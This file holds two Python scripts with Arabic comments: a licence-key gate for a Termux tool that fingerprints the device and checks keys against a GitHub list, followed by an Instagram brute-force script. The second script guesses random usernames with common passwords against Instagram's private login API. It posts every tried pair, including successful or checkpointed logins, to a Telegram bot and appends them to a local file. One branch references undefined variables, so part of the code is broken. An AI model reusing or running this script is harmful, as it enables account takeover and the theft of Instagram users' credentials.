import os
import uuid
import hashlib
import sys
import requests

# --- [ CONFIGURATION ] ---
# 1. يوزر التلجرام الخاص بك
ADMIN_ID = "P_KIQ"
# 2. رابط الـ RAW الخاص بملف المفاتيح على GitHub (تأكد أنه رابط مباشر يبدأ بـ raw)
GITHUB_URL = "https://raw.githubusercontent.com/username/repo/main/keys.txt"

def get_unique_id():
    """توليد بصمة فريدة للجهاز مستحيل تتكرر"""
    try:
        node = str(uuid.getnode()) 
        user = os.getlogin()
        raw_id = node + user
    except:
        raw_id = str(uuid.getnode())
    unique_hash = hashlib.md5(raw_id.encode()).hexdigest()[:10].upper()
    return f"TRUMP-{unique_hash}"

def login():
    key = get_unique_id()
    
    # Message to Admin
    msg = f"Hello Admin, Please activate my key. Key: {key}"
    t_url = f"https://t.me/{ADMIN_ID}?text={msg.replace(' ', '%20')}"

    os.system('clear')
    print(f"\033[1;31m      --- [ KEY SYSTEM ] ---")
    print(f"\033[1;37m------------------------------------------")
    print(f"\033[1;32mYour Key : \033[1;33m{key}")
    print(f"\033[1;37m------------------------------------------")
    
    print(f"\033[1;36m[!] Press Enter to go to Telegram and send Key")
    input(f"\033[1;32m[+] Press Enter... \033[0m")
    
    # محاولة فتح تلجرام
    os.system(f"termux-open-url '{t_url}' || am start -a android.intent.action.VIEW -d '{t_url}' > /dev/null 2>&1")
    
    print(f"\n\033[1;37m------------------------------------------")
    print(f"\033[1;32m[+] After sending the key, enter it below:")
    user_key = input(f"\033[1;37m[#] ENTER KEY: ").strip()

    # التحقق من جيت هاب (لن يعمل البرنامج إلا إذا كان المفتاح موجوداً)
    try:
        # جلب قائمة المفاتيح من الرابط
        response = requests.get(GITHUB_URL).text
        approved_keys = response.splitlines()

        if user_key in approved_keys:
            print("\n\033[1;32m[✓] Access Granted! Loading Tool...")
            os.system('sleep 2')
            # هنا ينتهي نظام الحماية ويبدأ تشغيل أداتك
        else:
            print("\n\033[1;31m[-] Access Denied! Key not found in server.")
            print(f"\033[1;33m[!] Contact @{ADMIN_ID} to activate your key.\033[0m")
            sys.exit()
    except Exception as e:
        print("\n\033[1;31m[-] Connection Error! Please check your internet.")
        sys.exit()

# تشغيل الحماية فوراً
if __name__ == "__main__":
    login()
    
    # ==========================================
    # --- كود أداتك الحقيقي يبدأ من هنا فقط ---
    # ==========================================
    os.system('clear')
    print("\033[1;32m[+] Tool Started Successfully!")
    # ضع هنا باقي أوامر أداتك...
# Look at Roux accomplishments  { @C4CCQ }

import requests
import random
from uuid import uuid4
E = '\033[1;31m'
G = '\033[1;32m'
def HsEyUn():
	
	token = input(G+'Enter Token :')
	id = input(G+'Enter Id : ')
	while True:
		us3 = 'qwertyuiopasdf_ghjklzxcvbnm'
		us0 = '09876_54321'
		use1 = us0 + us3
		userx = ''.join((random.choice(use1) for x in range(4)))
		usr = userx
		HsEu = ('1122334455', 'Aa123123', 'Aa123456', '12341234', 'qwer1234', '1234qwer')
		t1 = random.choice(usr)
		t = random.choice(HsEu)
		url = 'https://i.instagram.com/api/v1/accounts/login/'
		headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
'Cookie':'missing', 
'Accept-Encoding':'gzip, deflate', 
'Accept-Language':'en-US', 
'X-IG-Capabilities':'3brTvw==', 
'X-IG-Connection-Type':'WIFI', 
'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
'Host':'i.instagram.com'}
		uid= str(uuid4())
		data = {'uuid':uid,
'password':t, 
'username':usr, 
'device_id':uid, 
'from_reg':'false', 
'_csrftoken':'missing', 
'login_attempt_countn':'0'}
		reqq= requests.post(url, headers=headers, data=data, allow_redirects=True)
		
		if "rate_limit_error" in reqq.text:
			print (G+f"Kid -13 Ban : {usr}:{t}")
			tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text= ابو اسد صادلك يوزر 🔥\n = = = = = = = = = = = =\n USER : {usr}\n PASS : {t}\n = = = = = = = = = = = =')
			a = requests.post(tlg)
			open("Acconat.txt","a").write(f"Band >> {usr}:{t}\n")
			
		elif 'bad_password' in reqq.text:
			print(E+f"Error Password : {usr}:{t}")
		elif 'checkpoint_challenge_required' in reqq.text:
			print (G+f"Checkpoint : {usr}:{t}")
			tlgg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=ابو اسد صادلك يوزر 🔥\n = = = = = = = = = = = =\n USER : {username}\n PASS : {password}\n = = = = = = = = = = = =')
			a = requests.post(tlgg)
			open("Acconat.txt","a").write(f" Chckpoint >> {usr}:{t}\n")
		
		else:
			print(G+f"Fall Login ! : {usr}:{t}")
			tlggg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=ابو اسد صادلك يوزر 🔥\n = = = = = = = = = = = =\n USER : {usr}\n PASS : {t}\n = = = = = = = = = = = =')
			a = requests.post(tlggg)
HsEyUn()
